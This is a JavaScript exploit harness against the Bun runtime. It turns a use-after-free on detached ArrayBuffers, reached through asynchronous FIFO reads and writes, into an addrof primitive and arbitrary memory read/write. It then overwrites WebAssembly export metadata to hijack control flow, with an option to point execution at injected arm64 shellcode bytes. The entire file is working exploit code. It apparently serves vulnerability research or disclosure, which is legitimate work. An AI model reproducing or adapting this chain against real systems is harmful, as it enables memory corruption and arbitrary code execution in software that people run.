// No-FFI probe for turning the addrof -> ArrayBuffer metadata native view into
// a control-flow-adjacent write against WebAssembly export metadata.
//
// The layout census found a low image-range pointer at:
//   wasm function JSCell + WASM_EXEC_FIELD -> heap object
//   heap object + WASM_CODE_FIELD -> apparent executable/code pointer
//
// This harness creates two same-signature wasm exports, reads both apparent
// metadata objects, writes one export_b field over export_a's matching field,
// calls export_a, then restores export_a. A return-value change from 42 to 7 is
// a no-FFI control-flow redirection signal. No bun:ffi, helper dylib, dlsym, or
// broad symbol enumeration is used.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const addrofSize = Number(process.env.ADDROF_SIZE || 8192);
const addrofSlots = Number(process.env.ADDROF_SLOTS || 1024);
const addrofSprayCount = Number(process.env.ADDROF_SPRAY_COUNT || 4096);
const addrofElementOffset = Number(process.env.ADDROF_ELEMENT_OFFSET || 144);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 16384);
const bridgeAttempts = Number(process.env.BRIDGE_ATTEMPTS || 64);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || (1 << 20));
const wasmExecField = Number(process.env.WASM_EXEC_FIELD || 24);
const wasmCodeField = Number(process.env.WASM_CODE_FIELD || 24);
const markerImport = process.env.MARKER_IMPORT === "1";
const markerPath = process.env.MARKER_PATH || "/tmp/bun_uaf_noffi_wasm_marker";
const fakeDescriptor = process.env.FAKE_DESCRIPTOR === "1";
const fakeDescriptorMode = process.env.FAKE_DESCRIPTOR_MODE || "replacement";
const fakeDescriptorWordEnv = process.env.FAKE_DESCRIPTOR_WORD;
const patchScope = process.env.PATCH_SCOPE || (markerImport ? "cell" : "exec");
const patchField = Number(process.env.PATCH_FIELD || (patchScope === "cell" ? 48 : wasmCodeField));
const readBytes = Number(process.env.READ_BYTES || 64);
const warmIterations = Number(process.env.WARM_ITERATIONS || 10000);
const retainedBridgeCarriers = [];

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function hex(value, width = 16) {
  return `0x${value.toString(16).padStart(width, "0")}`;
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-wasm-codeptr-${label}-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(fifo.path); } catch {}
}

function isAgain(error) {
  return error?.code === "EAGAIN" || error?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (error) {
      if (isAgain(error)) break;
      throw error;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (error) {
      if (!isAgain(error)) throw error;
    }
    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LEBytes(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function readU64LE(view, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(view[offset + i]);
  return value;
}

function writeU64LE(view, offset, value) {
  let v = value;
  for (let i = 0; i < 8; i++) {
    view[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
}

function payloadU64(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function classifyPointer(value) {
  if ((value >> 48n) !== 0n || (value & 0x7n) !== 0n) return null;
  if (value >= 0x0000000100000000n && value < 0x0000008000000000n) return "low-code-or-image";
  if (value >= 0x0000600000000000n && value < 0x0000640000000000n) return "asan-heap";
  if (value >= 0x0000100000000000n && value < 0x0000800000000000n) return "canonical-high";
  return null;
}

async function addrof(target) {
  const fifo = makeFifo("addrof");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(addrofSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < addrofSprayCount; i++) {
      const arr = new Array(addrofSlots);
      for (let j = 0; j < addrofSlots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, addrofSize, "addrof-leak");
    await done;
    return readU64LEBytes(leaked, addrofElementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

function makeBridgeCarrier(index) {
  const fill = (0x71 + (index & 15)) & 0xff;
  const view = new Uint8Array(new ArrayBuffer(viewSize));
  view.fill(fill);
  return view;
}

function freshCarrierBytes(carrier) {
  return new Uint8Array(carrier.buffer);
}

function allocateBridgeCarriers() {
  const retained = [];
  for (let i = 0; i < sprayCount; i++) retained.push(makeBridgeCarrier(i));
  return retained;
}

async function corruptBridgeToAddress(address) {
  const path = join(tmpdir(), `bun-wasm-codeptr-write-${process.pid}-${Math.random().toString(16).slice(2)}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    const bridgeCarriers = allocateBridgeCarriers();
    gcNow();
    fs.writeSync(fd, payloadU64(address), 0, 8);
    const result = await done;
    return { bridgeCarriers, bytesRead: result.bytesRead, err: result.err?.message };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findRemappedBridge(bridgeCarriers, requireLengthFields = false) {
  for (let i = 0; i < bridgeCarriers.length; i++) {
    try {
      const fresh = freshCarrierBytes(bridgeCarriers[i]);
      const expected = (0x71 + (i & 15)) & 0xff;
      if (fresh[0] === expected) continue;
      const dataPtr = readU64LE(fresh, 16);
      const byteLength = readU64LE(fresh, 48);
      const maxByteLength = readU64LE(fresh, 56);
      const lengthOk = byteLength === BigInt(viewSize) && maxByteLength === BigInt(viewSize);
      if (classifyPointer(dataPtr) && (!requireLengthFields || lengthOk)) {
        return { index: i, fresh, dataPtr, byteLength, maxByteLength };
      }
    } catch {}
  }
  return null;
}

async function buildNativeView() {
  const victimBuffer = new ArrayBuffer(viewSize);
  const victimView = new Uint8Array(victimBuffer);
  victimView.fill(0xa5);
  const victimAddress = await addrof(victimBuffer);

  let wrapperBridge = null;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(victimAddress);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    wrapperBridge = findRemappedBridge(result.bridgeCarriers, false);
    if (wrapperBridge) break;
  }
  if (!wrapperBridge) throw new Error("failed to map ArrayBuffer wrapper");

  let metadataBridge = null;
  for (let attempt = 1; attempt <= bridgeAttempts; attempt++) {
    const result = await corruptBridgeToAddress(wrapperBridge.dataPtr);
    retainedBridgeCarriers.push(result.bridgeCarriers);
    metadataBridge = findRemappedBridge(result.bridgeCarriers, true);
    if (metadataBridge) break;
  }
  if (!metadataBridge) throw new Error("failed to map ArrayBuffer metadata");

  return {
    victimBuffer,
    metadataView: metadataBridge.fresh,
    originalDataPtr: metadataBridge.dataPtr,
    victimAddress,
    wrapperAddress: wrapperBridge.dataPtr,
  };
}

function wordsFromBytes(bytes) {
  const words = [];
  for (let offset = 0; offset + 8 <= bytes.length; offset += 8) {
    const value = readU64LEBytes(bytes, offset);
    words.push({ offset, value: hex(value), class: classifyPointer(value) });
  }
  return words;
}

const native = await buildNativeView();

function withNativePointer(address, fn) {
  writeU64LE(native.metadataView, 16, address);
  try {
    return fn(new Uint8Array(native.victimBuffer));
  } finally {
    writeU64LE(native.metadataView, 16, native.originalDataPtr);
  }
}

function readAddress(address, length = readBytes) {
  return withNativePointer(address, view => Buffer.from(view.subarray(0, Math.min(length, view.length))));
}

function writeAddress(address, bytes) {
  return withNativePointer(address, view => {
    view.set(bytes, 0);
  });
}

function writeU64Address(address, value) {
  writeAddress(address, payloadU64(value));
}

async function arrayBufferDataPointer(buffer) {
  const wrapperAddress = await addrof(buffer);
  const wrapperPrefix = readAddress(wrapperAddress, 64);
  const metadataAddress = readU64LEBytes(wrapperPrefix, 16);
  const metadataPrefix = readAddress(metadataAddress, 64);
  const dataAddress = readU64LEBytes(metadataPrefix, 16);
  return {
    wrapperAddress,
    metadataAddress,
    dataAddress,
    wrapperWords: wordsFromBytes(wrapperPrefix),
    metadataWords: wordsFromBytes(metadataPrefix),
  };
}

function makeWasmExports() {
  let markerArmed = false;
  const wasm = markerImport
    ? new Uint8Array([
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
      0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
      0x02, 0x0c, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x04, 0x6d, 0x61, 0x72, 0x6b, 0x00, 0x00,
      0x03, 0x03, 0x02, 0x00, 0x00,
      0x07, 0x09, 0x02, 0x01, 0x61, 0x00, 0x01, 0x01, 0x62, 0x00, 0x02,
      0x0a, 0x0b, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x04, 0x00, 0x10, 0x00, 0x0b,
    ])
    : new Uint8Array([
      0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
      0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
      0x03, 0x03, 0x02, 0x00, 0x00,
      0x07, 0x09, 0x02, 0x01, 0x61, 0x00, 0x00, 0x01, 0x62, 0x00, 0x01,
      0x0a, 0x0b, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x04, 0x00, 0x41, 0x07, 0x0b,
    ]);
  const imports = markerImport ? {
    env: {
      mark() {
        if (markerArmed) fs.writeFileSync(markerPath, `wasm-marker:${process.pid}\n`);
        return 7;
      },
    },
  } : {};
  const instance = new WebAssembly.Instance(new WebAssembly.Module(wasm), imports);
  const a = instance.exports.a;
  const b = instance.exports.b;
  for (let i = 0; i < warmIterations; i++) {
    a();
    b();
  }
  return {
    a,
    b,
    armMarker() { markerArmed = true; },
    disarmMarker() { markerArmed = false; },
  };
}

async function inspectExport(label, fn) {
  const functionAddress = await addrof(fn);
  const cellPrefix = readAddress(functionAddress, readBytes);
  const execAddress = readU64LEBytes(cellPrefix, wasmExecField);
  const execPrefix = readAddress(execAddress, readBytes);
  const codeAddress = readU64LEBytes(execPrefix, wasmCodeField);
  return {
    label,
    functionAddress,
    execAddress,
    codeAddress,
    cellPrefix,
    execPrefix,
    summary: {
      label,
      functionAddress: hex(functionAddress),
      execAddress: hex(execAddress),
      execClass: classifyPointer(execAddress),
      codeAddress: hex(codeAddress),
      codeClass: classifyPointer(codeAddress),
      cellWords: wordsFromBytes(cellPrefix),
      execWords: wordsFromBytes(execPrefix),
    },
  };
}

const { a, b, armMarker, disarmMarker } = makeWasmExports();
const beforeA = a();
const beforeB = b();
if (markerImport) {
  disarmMarker();
  try { fs.unlinkSync(markerPath); } catch {}
}
const markerBefore = markerImport ? fs.existsSync(markerPath) : undefined;
const infoA = await inspectExport("a", a);
const infoB = await inspectExport("b", b);

function patchBase(info) {
  switch (patchScope) {
    case "cell":
      return { address: info.functionAddress, bytes: info.cellPrefix, label: "function-cell" };
    case "exec":
      return { address: info.execAddress, bytes: info.execPrefix, label: "exec-metadata" };
    default:
      throw new Error("PATCH_SCOPE must be cell or exec");
  }
}

const patchA = patchBase(infoA);
const patchB = patchBase(infoB);
if (patchField < 0 || patchField + 8 > patchA.bytes.length || patchField + 8 > patchB.bytes.length) {
  throw new Error("PATCH_FIELD must leave room for one qword inside READ_BYTES");
}

const patchAddress = patchA.address + BigInt(patchField);
const originalPatchValue = readU64LEBytes(patchA.bytes, patchField);
const replacementPatchValue = readU64LEBytes(patchB.bytes, patchField);
let effectiveReplacementPatchValue = replacementPatchValue;
let fakeDescriptorSummary = null;

if (fakeDescriptor) {
  if (patchScope !== "cell" || patchField !== 48) {
    throw new Error("FAKE_DESCRIPTOR requires PATCH_SCOPE=cell and PATCH_FIELD=48");
  }

  const originalDescriptorBytes = readAddress(originalPatchValue, 8);
  const replacementDescriptorBytes = readAddress(replacementPatchValue, 8);
  const originalDescriptorWord = readU64LEBytes(originalDescriptorBytes, 0);
  const replacementDescriptorWord = readU64LEBytes(replacementDescriptorBytes, 0);
  let shellcodeData = null;

  let fakeDescriptorWord;
  switch (fakeDescriptorMode) {
    case "original":
      fakeDescriptorWord = originalDescriptorWord;
      break;
    case "replacement":
      fakeDescriptorWord = replacementDescriptorWord;
      break;
    case "custom":
      if (!fakeDescriptorWordEnv) throw new Error("FAKE_DESCRIPTOR_MODE=custom requires FAKE_DESCRIPTOR_WORD");
      fakeDescriptorWord = BigInt(fakeDescriptorWordEnv);
      break;
    case "data-ret": {
      const shellcodeBuffer = new ArrayBuffer(16);
      const shellcodeBytes = new Uint8Array(shellcodeBuffer);
      shellcodeBytes.set([0xc0, 0x03, 0x5f, 0xd6]); // arm64 ret
      shellcodeData = await arrayBufferDataPointer(shellcodeBuffer);
      fakeDescriptorWord = shellcodeData.dataAddress;
      break;
    }
    case "zero":
      fakeDescriptorWord = 0n;
      break;
    default:
      throw new Error("FAKE_DESCRIPTOR_MODE must be original, replacement, custom, data-ret, or zero");
  }

  const fakeDescriptorBuffer = new ArrayBuffer(8);
  const fakeDescriptorBytes = new Uint8Array(fakeDescriptorBuffer);
  fakeDescriptorBytes.set(payloadU64(fakeDescriptorWord));
  const fakeDescriptorData = await arrayBufferDataPointer(fakeDescriptorBuffer);
  effectiveReplacementPatchValue = fakeDescriptorData.dataAddress;
  fakeDescriptorSummary = {
    mode: fakeDescriptorMode,
    bufferAddress: hex(fakeDescriptorData.wrapperAddress),
    metadataAddress: hex(fakeDescriptorData.metadataAddress),
    dataAddress: hex(fakeDescriptorData.dataAddress),
    originalDescriptorPointer: hex(originalPatchValue),
    originalDescriptorWord: hex(originalDescriptorWord),
    originalDescriptorWordClass: classifyPointer(originalDescriptorWord),
    replacementDescriptorPointer: hex(replacementPatchValue),
    replacementDescriptorWord: hex(replacementDescriptorWord),
    replacementDescriptorWordClass: classifyPointer(replacementDescriptorWord),
    shellcodeData: shellcodeData && {
      bufferAddress: hex(shellcodeData.wrapperAddress),
      metadataAddress: hex(shellcodeData.metadataAddress),
      dataAddress: hex(shellcodeData.dataAddress),
    },
    fakeDescriptorWord: hex(fakeDescriptorWord),
    fakeDescriptorWordClass: classifyPointer(fakeDescriptorWord),
  };
}

let patchedA;
let restoredA;
let callError;
let restoreError;
let patchError;

try {
  writeU64Address(patchAddress, effectiveReplacementPatchValue);
  if (markerImport) armMarker();
  patchedA = a();
} catch (error) {
  callError = error?.message || String(error);
} finally {
  if (markerImport) disarmMarker();
  try {
    writeU64Address(patchAddress, originalPatchValue);
    restoredA = a();
  } catch (error) {
    restoreError = error?.message || String(error);
  }
}

const rereadAExec = (() => {
  try { return readAddress(infoA.execAddress, readBytes); } catch { return null; }
})();
const markerAfter = markerImport ? fs.existsSync(markerPath) : undefined;

const ok =
  beforeA === 42 &&
  beforeB === 7 &&
  !patchError &&
  !callError &&
  !restoreError &&
  patchedA === 7 &&
  restoredA === 42 &&
  (!markerImport || (markerBefore === false && markerAfter === true));

const output = {
  final: true,
  harness: "wasm-export-code-pointer-redirect-probe",
  noFfi: true,
  nativeHelperDylib: false,
  markerImport,
  markerPath: markerImport ? markerPath : undefined,
  markerBefore,
  markerAfter,
  fakeDescriptor,
  fakeDescriptorMode: fakeDescriptor ? fakeDescriptorMode : undefined,
  fakeDescriptorSummary,
  wasmExecField,
  wasmCodeField,
  patchScope,
  patchField,
  patchTarget: patchA.label,
  patchAddress: hex(patchAddress),
  originalPatchValue: hex(originalPatchValue),
  originalPatchClass: classifyPointer(originalPatchValue),
  replacementPatchValue: hex(replacementPatchValue),
  replacementPatchClass: classifyPointer(replacementPatchValue),
  effectiveReplacementPatchValue: hex(effectiveReplacementPatchValue),
  effectiveReplacementPatchClass: classifyPointer(effectiveReplacementPatchValue),
  warmIterations,
  victimAddress: hex(native.victimAddress),
  wrapperAddress: hex(native.wrapperAddress),
  originalDataPtr: hex(native.originalDataPtr),
  beforeA,
  beforeB,
  infoA: infoA.summary,
  infoB: infoB.summary,
  patchedA,
  restoredA,
  patchError,
  callError,
  restoreError,
  rereadAExecWords: rereadAExec ? wordsFromBytes(rereadAExec) : null,
  conclusion: ok
    ? (markerImport
      ? "patching export a metadata with export b's matching field makes a() reach the marker wasm export path and create the marker file, then restores to 42"
      : "patching export a metadata with export b's matching field changes a() from 42 to 7, then restores to 42")
    : "no reliable wasm export metadata redirection observed",
  ok,
};

fs.writeSync(1, `${JSON.stringify(output, null, 2)}\n`);
process.reallyExit(ok ? 86 : 1);
